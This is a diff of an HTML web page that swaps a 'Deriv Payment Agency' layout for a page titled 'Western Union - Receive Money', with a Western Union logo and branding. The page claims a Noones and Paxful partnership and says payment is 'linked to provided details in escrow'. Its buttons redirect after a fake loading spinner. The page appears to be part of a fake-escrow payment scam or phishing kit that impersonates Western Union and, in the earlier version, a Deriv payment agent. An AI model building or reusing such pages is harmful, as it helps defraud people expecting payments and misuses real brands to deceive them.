@@ -2,127 +2,150 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <title>Deriv Payment Agency</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!-- Bootstrap 5 -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-
-    <!-- Bootstrap Icons -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
-
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Western Union - Receive Money</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
     <style>
-        body {
-            background-color: #0b0e14;
-            color: #ffffff;
-            font-family: "Segoe UI", sans-serif;
+            body,
+        html {
+            height: 100%;
+            margin: 0;
+        }
+        
+        .hero-section {
+            background: url('ee8901fd-1088-4e47-a61c-daf27e3cddef.png') no-repeat center center/cover;
+            height: 100vh;
+            color: white;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+        }
+        
+        .content {
+            position: relative;
+            z-index: 2;
+        }
+        
+        .highlight {
+            color: #ffc107;
+            font-weight: bold;
+        }
+        
+        .btn-yellow {
+            background-color: #ffc107;
+            color: black;
+            font-weight: 600;
+        }
+        
+        .btn-yellow:hover {
+            background-color: #e0a800;
+            color: black;
         }
         
         .logo {
-            text-align: center;
-            padding: 40px 10px 20px;
+            position: absolute;
+            top: 20px;
+            left: 30px;
+            display: flex;
+            align-items: center;
+            z-index: 2;
         }
         
         .logo img {
-            height: 50px;
+            height: 40px;
+            margin-right: 10px;
         }
         
-        .hero {
-            text-align: center;
-            padding: 40px 20px;
+        .logo span {
+            font-size: 24px;
+            font-weight: 600;
+            color: white;
         }
         
-        .hero h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
+        .loader {
+            width: 70px;
+            aspect-ratio: 1;
+            background: radial-gradient(farthest-side, #ffa516 90%, #0000) center/16px 16px, radial-gradient(farthest-side, green 90%, #0000) bottom/12px 12px;
+            background-repeat: no-repeat;
+            animation: l17 1s infinite linear;
+            position: relative;
+            margin: 0 auto;
         }
         
-        .card-box {
-            background: #12161c;
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
+        .loader::before {
+            content: "";
+            position: absolute;
+            width: 8px;
+            aspect-ratio: 1;
+            inset: auto 0 16px;
+            margin: auto;
+            background: #ccc;
+            border-radius: 50%;
+            transform-origin: 50% calc(100% + 10px);
+            animation: inherit;
+            animation-duration: 0.5s;
         }
         
-        .card-box h4 {
-            margin-bottom: 15px;
-        }
-        
-        .card-box ul {
-            padding-left: 18px;
-        }
-        
-        footer {
-            text-align: center;
-            font-size: 13px;
-            color: #aaa;
-            margin: 40px 15px 20px;
-        }
+        @keyframes l17 {
+            100% {
+                transform: rotate(1turn)
+            }
+            /* Tablet/Desktop */
+            @media (min-width: 768px) {
+                .container {
+                    flex-direction: row;
+                    gap: 1rem;
+                }
+            }
     </style>
 </head>
 
 <body>
 
-    <!-- LOGO -->
-    <div class="logo">
-        <img src="https://deriv.com/static/deriv-logo-white.svg" alt="Deriv Logo">
-    </div>
+    <div class="hero-section">
+        <div class="overlay"></div>
 
-    <!-- HERO TEXT -->
-    <div class="hero">
-        <h1>Deriv Payment Agency</h1>
-        <p>Fast, Secure & Reliable Deposits and Withdrawals</p>
-        <p>Escrow link will be send to your email, Give out mpesa only on Escrow</p>
-    </div>
-
-    <!-- MAIN CONTENT -->
-    <div class="container">
-
-        <div class="row">
-
-            <!-- DEPOSIT -->
-            <div class="col-md-6">
-                <div class="card-box">
-                    <h4><i class="bi bi-wallet2"></i> Deposit</h4>
-                    <ul>
-                        <li>Minimum deposit: $5</li>
-                        <li>Instant processing</li>
-                        <li>Supports Mpesa</li>
-                    </ul>
-
-                    <a href="deriv.html" class="btn btn-success w-100 mt-3">
-                    Deposit Now
-                </a>
-                </div>
-            </div>
-
-            <!-- WITHDRAW -->
-            <div class="col-md-6">
-                <div class="card-box">
-                    <h4><i class="bi bi-cash-coin"></i> Withdraw</h4>
-                    <ul>
-                        <li>Minimum withdrawal: $10</li>
-                        <li>Processing time: 5–15 minutes</li>
-                        <li>Available 24/7</li>
-                    </ul>
-
-                    <a href="deriv.html" class="btn btn-danger w-100 mt-3">
-                    Withdraw Now
-                </a>
-                </div>
-            </div>
-
+        <div class="logo">
+            <img src="/westernlogo.png" alt="Western Union Logo" />
+            <span>Western Union</span>
         </div>
 
+        <div class="container content">
+            <h2 class="display-5"><span class="highlight">\\</span> Receive money</h2>
+            <p class="lead">Receive money at hundreds of thousands of our agent locations.</p>
+            <p>In 200 countries and territories<sup>1</sup> around the world.</p>
+            <div class="d-flex flex-column flex-md-row justify-content-center gap-3 mt-3">
+                <button class="btn btn-yellow" onclick="redirectToPage()">Receive Payment</button>
+                <button class="btn btn-yellow" onclick="redirectToPage()">Track Payment</button>
+            </div>
+            <div id="loaderContainer" class="mt-4" style="display:none;">
+                <div class="loader"></div>
+            </div>
+            <p class="mt-4">Noones and Paxful crypto trading platform has partnered with us on payment transfer through their visa cards. Your payment now is link to provided details in escrow.</p>
+        </div>
     </div>
 
-    <!-- FOOTER -->
-    <footer>
-        This website is not owned by Deriv.com. We are an independent Deriv Payment Agent.
-    </footer>
-
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        function redirectToPage() {
+            document.getElementById('loaderContainer').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'noones.html';
+            }, 1500);
+        }
+    </script>
 </body>
 
 </html>
